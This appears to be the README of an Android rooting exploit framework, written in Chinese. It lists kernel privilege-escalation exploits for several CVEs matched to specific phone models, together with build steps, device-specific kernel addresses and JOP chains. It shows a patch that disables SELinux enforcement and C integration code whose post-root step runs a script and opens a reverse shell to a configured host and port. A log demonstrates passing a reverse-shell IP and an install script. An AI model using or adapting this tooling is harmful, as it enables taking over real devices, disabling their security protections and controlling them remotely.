@@ -1,0 +1,367 @@
+#+OPTIONS: ^:{}
+#+OPTIONS: toc:nil
+#+AUTHOR: idhyt
+
+** Warning
+
+*请遵守GPL开源协议, 请遵守法律法规, 本项目仅供学习和交流, 请勿用于非法用途!*
+
+*道路千万条, 安全第一条, 行车不规范, 亲人两行泪.*
+
+** Android Root Zap Framework [100%]
+
+早期研究 Android Root 时做的提权方案和部分漏洞的利用和适配, 感激曾经一起学习和共事的伙伴们.
+
+- [X] 通用的序列化root适配参数
+- [X] 非常容易集成, 只需要根据漏洞实现任意读写即可
+- [X] 通用内核提取patch方案, 任意读写后一个函数全搞定
+- [X] 内核保护机制绕过(PXN, SElinux)
+- [X] 部分厂商内核保护机制绕过(huawei, samsung, oppo, vivo)
+
+** Exploit(部分)
+
+*1001*: CVE-2017-8890 v1版, 适配Nexus6P
+
+*1002*: CVE-2017-8890 v2版, 适配华为P10
+
+*1003*: CVE-2017-8890 兼容所有64位机型，如Nexus6p, 华为MT7, MT10, P10等
+
+*1004*: CVE-2017-8890 针对32位机型，如Nexus5
+
+*1010*: CVE-2017-9077 同CVE-2017-8890
+
+*1021*: CVE-2015-1805 V1, 适配SM-A700L
+
+*1022*: CVE-2015-1805 V2, 适配更多机型
+
+*1041*: CVE-2015-3636 适配了nexus4等机型
+
+*1051*: CVE-2016-5159 dirtycow漏洞, android 5.0以下机型
+
+** Build
+
+需要保证主机上存在 make 和 ndk-build (版本过高可能存在兼容性问题, 建议小于25以下版本)
+
+#+begin_src shell
+
+  make build RS=CVE-2015-1805/1022
+
+#+end_src
+
+** Integration
+
+*** 标志位
+
+#+begin_example
+
+n=sn&k=[101=kfunc1;102=kfunc2;]&j=[index1=jop1;0x=0x0;index2=jop2;0x0=0x0;]&p[addr=value=len;]
+
+#+end_example
+
+
+- n: 方案号
+
+- k: *内核函数* 地址以及一些常用的 *偏移量*, 需要提前在 *param.h* 中声明, 包含在 *[]* 中，用 *;* 分割, 结尾必须包含 *;*
+
+- j: jop地址, 包含在 *[]* 中, 用 *;* 分割, 结尾必须包含 *;* , 每条jop以 *0x0=0x0* 结尾, 结尾必须包含 *;* , 预留了5条jop
+
+- p: root后patch地址与内存修复, 主要针对selinux和需要修复的寄存器, 包含在 *[]* 中, 用 *;* 分割, 结尾必须包含 *;*
+
+- r: 可选参数, 反弹shell和脚本, 需要提前在 *param.h* 中声明, 包含在 *[]* 中, 用 *;* 分割, 结尾必须包含 *;*
+
+每个参数标志位由 *&* 分割, 如：
+
+#+begin_example
+
+n=sn&k=[101=kfunc1;102=kfunc2;]&j=[index1=jop1;0x=0x0;index2=jop2;0x0=0x0;]&p[addr=value=len;]&r=[901=ip;902=port;903=install.sh;]
+
+#+end_example
+
+*** 适配参数示例
+
+Nexus 6P 适配参数如下:
+
+#+begin_src shell
+
+  ./rootz "n=1001&k=[101=0xffffffc001a044a0;102=0x48;104=0xffffffc001779fe0;105=0x70;201=0xffffffc00074c954;]&j=[0x180=0xaaaaaaaa;0x158=0xbbbbbbbb;0x2d0=0xffffffc00024c2c4;0x0=0x0;0x00=0xffffffc000afe07c;0x28=0xbbbbbbbb;0x48=0xffffffc0002ef958;0x90=0xdddddddd;0x10=0xffffffc000ce6000;0x8=0xffffffc000318610;0x0=0x0;]&p=[0xffffffc00193a1bc=0x0=0x4;]"
+
+#+end_src
+
+n=1001: 方案号1001
+
+#+begin_example
+
+k=[101=0xffffffc001a044a0;102=0x48;104=0xffffffc001779fe0;105=0x70;201=0xffffffc00074c954;]
+
+#+end_example
+
+param.h中定义了
+
+#+begin_src c
+
+  #define k_ptmx_fops "101"
+  #define k_ptmx_ioctl_offset "102"
+  #define k_init_task "104"
+  #define k_task_security_offset "105"
+
+#+end_src
+
+最终解析后会自动赋值. (r字段相同解析方式)
+
+#+begin_example
+
+j=[0x180=0xaaaaaaaa;0x158=0xbbbbbbbb;0x2d0=0xffffffc00024c2c4;0x0=0x0;0x00=0xffffffc000afe07c;0x28=0xbbbbbbbb;0x48=0xffffffc0002ef958;0x90=0xdddddddd;0x10=0xffffffc000ce6000;0x8=0xffffffc000318610;0x0=0x0;]
+
+#+end_example
+
+以 0x0=0x0 分割，总共2条jop, 解析后对应的jop结构为
+
+#+begin_example
+
+jop1:
+{0x180, 0xaaaaaaaa}
+{0x158, 0xbbbbbbbb}
+{0x2d0, 0xffffffc00024c2c4}
+{0x0, 0x0}
+jop2:
+{0x0, 0xffffffc000afe07c}
+{0x28, 0xbbbbbbbb}
+{0x48, 0xffffffc0002ef958}
+{0x90, 0xdddddddd}
+{0x10, 0xffffffc000ce6000}
+{0x8, 0xffffffc000318610}
+{0x0, 0x0}
+
+#+end_example
+
+p=[0xffffffc00193a1bc=0x0=0x4;]
+
+总共一个patch的地址，地址为0xffffffc00193a1bc(selinux_enforcing), 值为0, 长度4个字节
+
+解析成对应的patch结构为
+
+#+begin_example
+
+p_patch:
+{0xffffffc00193a1bc, 0x0, 0x4}
+{0x0, 0x0, 0x0}
+
+#+end_example
+
+*** 新增root方案集成
+
+代码部分需要引入参数解析部分内容, 主要为 *rootz_before* 和 *rootz_after* 两个函数, 代码形似
+
+#+begin_src c
+
+  int main(int argc, char *argv[]) {
+
+    if(rootz_before(argc, argv)) {
+      log_dump(LOG_ERR, "[-] rootz_before failed!\n");
+      return -1;
+    }
+
+    // 提权操作
+    exploit();
+
+    if(rootz_after()) {
+      log_dump(LOG_ERR, "[-] rootz_after failed!\n");
+    }
+
+    while(1);
+
+    return 0;
+  }
+
+#+end_src
+
+引入的代码内容如下:
+
+
+#+begin_src c
+
+  /* ------------------ root define begin ------------------- */
+  #include "rootz.h"
+  #include "log.h"
+
+  /* adp args */
+  static int adp_sn;
+  static unsigned long adp_init_task;
+  static unsigned long adp_task_security_offset;
+
+  static unsigned long adp_ptmx_fops;
+  static unsigned long adp_ptmx_ioctl_offset;
+  static unsigned long adp_patch_ptmx_ioctl_jop;
+
+  /* run script path */
+  static char adp_script_path[0xff] = { 0 };
+
+  /* reverse shell ip&port */
+  static char adp_rshell_ip[0x40] = { 0 };
+  static char adp_rshell_port[0x10] = { 0 };
+
+  /*
+    初始化适配参数
+  ,*/
+  #include "dict.h"
+
+  extern dict_t *transl_param_dict;
+
+  static int get_adp_ulval(char *name, unsigned long *value) {
+    char *var;
+
+    if (!dict_get(transl_param_dict, name, (void **)&var)) {
+      log_dump(LOG_ERR, "[-] get %s failed\n", name);
+      return 0;
+    }
+    ,*value = strtoul(var, NULL, 16);
+    log_dump(LOG_DEBUG, "%s = 0x%lx\n", name, *value);
+    return 1;
+  }
+
+  static int get_adp_str(char *name, char *value, int len) {
+    char *var;
+
+    if (!dict_get(transl_param_dict, name, (void **)&var)) {
+      log_dump(LOG_ERR, "[-] get %s failed\n", name);
+      return 0;
+    }
+    strncpy(value, var, len);
+    log_dump(LOG_DEBUG, "%s = %s, %d\n", name, value, strlen(value));
+    return 1;
+  }
+
+  static int rootz_before(int argc, char *argv[]) {
+    // 设置日志路径, 不设置则打印到控制台
+    // set_logfile_path("/data/local/tmp/8890.log");
+    // 适配参数初始化
+    if (parse_args(argc, argv) < 0) {
+      log_dump(LOG_ERR, "[-] parse_args failed\n");
+      return -1;
+    }
+
+    char *var;
+
+    // 0 failed
+
+    /* root before */
+    if (!dict_get(transl_param_dict, n_sn, (void **)&var)) {
+      log_dump(LOG_ERR, "[-] get n_sn failed\n");
+      return -1;
+    }
+    adp_sn = atoi(var);
+    log_dump(LOG_DEBUG, "adp_sn = %d\n", adp_sn);
+
+    if(!get_adp_ulval(k_init_task, &adp_init_task)) return -1;
+    if(!get_adp_ulval(k_task_security_offset, &adp_task_security_offset)) return -1;
+    if(!get_adp_ulval(k_ptmx_fops, &adp_ptmx_fops)) return -1;
+    if(!get_adp_ulval(k_ptmx_ioctl_offset, &adp_ptmx_ioctl_offset)) return -1;
+    if(!get_adp_ulval(j_patch_ptmx_ioctl_jop, &adp_patch_ptmx_ioctl_jop)) return -1;
+
+    /* root after */
+    get_adp_str(r_script_path, adp_script_path, sizeof(adp_script_path));
+    get_adp_str(r_rshell_ip, adp_rshell_ip, sizeof(adp_rshell_ip));
+    get_adp_str(r_rshell_port, adp_rshell_port, sizeof(adp_rshell_port));
+
+  #if 0
+    printf(" adp_init_task = 0x%lx\n", adp_init_task);
+    printf(" adp_task_security_offset = 0x%lx\n", adp_task_security_offset);
+    printf(" adp_ptmx_fops = 0x%lx\n", adp_ptmx_fops);
+    printf(" adp_ptmx_ioctl_offset = 0x%lx\n", adp_ptmx_ioctl_offset);
+    printf(" adp_patch_ptmx_ioctl_jop = 0x%lx\n", adp_patch_ptmx_ioctl_jop);
+
+  #endif
+
+
+    return 0;
+  }
+
+  /*
+    提权过后的操作
+  ,*/
+
+  static int rootz_after() {
+    char *var;
+
+    if(strlen(adp_script_path)) {
+      run_shell_commond("/system/bin/sh", adp_script_path);
+    }
+
+    if(strlen(adp_rshell_ip) && strlen(adp_rshell_port)) {
+      log_dump(LOG_DEBUG, "rshell: ip = %s, port = %s\n", adp_rshell_ip, adp_rshell_port);
+      rshell_simple(adp_rshell_ip, adp_rshell_port);
+    }
+
+    dict_destory(transl_param_dict);
+    free(transl_param_dict);
+    return 0;
+  }
+
+  /* ------------------ root define end ------------------- */
+
+#+end_src
+
+完整的参数解析流日志：
+
+#+begin_src shell
+
+  [*] /system/bin/sh -c "/data/local/tmp/rootz 'n=1001&k=[101=0xffffffc001a044a0;102=0x48;104=0xffffffc001779fe0;105=0x70;201=0xffffffc00074c954;]&j=[0x180=0xaaaaaaaa;0x158=0xbbbbbbbb;0x2d0=0xffffffc00024c2c4;0x0=0x0;0x00=0xffffffc000afe07c;0x28=0xbbbbbbbb;0x48=0xffffffc0002ef958;0x90=0xdddddddd;0x10=0xffffffc000ce6000;0x8=0xffffffc000318610;0x0=0x0;]&p=[0xffffffc00193a1bc=0x0=0x4;]&r=[901=192.168.0.105;902=4000;903=/data/local/tmp/install.sh;]'"
+  args: n=1001
+  key = n, value = 1001
+  args: k=[101=0xffffffc001a044a0;102=0x48;104=0xffffffc001779fe0;105=0x70;201=0xffffffc00074c954;]
+  key = k, value = [101=0xffffffc001a044a0;102=0x48;104=0xffffffc001779fe0;105=0x70;201=0xffffffc00074c954;]
+  args: j=[0x180=0xaaaaaaaa;0x158=0xbbbbbbbb;0x2d0=0xffffffc00024c2c4;0x0=0x0;0x00=0xffffffc000afe07c;0x28=0xbbbbbbbb;0x48=0xffffffc0002ef958;0x90=0xdddddddd;0x10=0xffffffc000ce6000;0x8=0xffffffc000318610;0x0=0x0;]
+  key = j, value = [0x180=0xaaaaaaaa;0x158=0xbbbbbbbb;0x2d0=0xffffffc00024c2c4;0x0=0x0;0x00=0xffffffc000afe07c;0x28=0xbbbbbbbb;0x48=0xffffffc0002ef958;0x90=0xdddddddd;0x10=0xffffffc000ce6000;0x8=0xffffffc000318610;0x0=0x0;]
+  jop num = 2
+  args: p=[0xffffffc00193a1bc=0x0=0x4;]
+  key = p, value = [0xffffffc00193a1bc=0x0=0x4;]
+  p_addr = 0xffffffc00193a1bc, p_value = 0x0, p_len = 0x4
+  args: r=[901=192.168.0.105;902=4000;903=/data/local/tmp/install.sh;]
+  key = r, value = [901=192.168.0.105;902=4000;903=/data/local/tmp/install.sh;]
+
+  transl_param_dict: 0x7104a02060
+  104 => 0xffffffc001779fe0
+  105 => 0x70
+  201 => 0xffffffc00074c954
+  n => 1001
+  901 => 192.168.0.105
+  902 => 4000
+  903 => /data/local/tmp/install.sh
+  101 => 0xffffffc001a044a0
+  102 => 0x48
+
+  j_jop:
+  jop1:
+  {0x180, 0xaaaaaaaa}
+  {0x158, 0xbbbbbbbb}
+  {0x2d0, 0xffffffc00024c2c4}
+  {0x0, 0x0}
+  jop2:
+  {0x0, 0xffffffc000afe07c}
+  {0x28, 0xbbbbbbbb}
+  {0x48, 0xffffffc0002ef958}
+  {0x90, 0xdddddddd}
+  {0x10, 0xffffffc000ce6000}
+  {0x8, 0xffffffc000318610}
+  {0x0, 0x0}
+  jop3:
+  {0x0, 0x0}
+  jop4:
+  {0x0, 0x0}
+  jop5:
+  {0x0, 0x0}
+
+  p_patch:
+  {0xffffffc00193a1bc, 0x0, 0x4}
+  {0x0, 0x0, 0x0}
+  adp_sn = 1001
+  104 = 0xffffffc001779fe0
+  105 = 0x70
+  101 = 0xffffffc001a044a0
+  102 = 0x48
+  201 = 0xffffffc00074c954
+  903 = /data/local/tmp/install.sh, 26
+  901 = 192.168.0.105, 13
+  902 = 4000, 4
+
+#+end_src
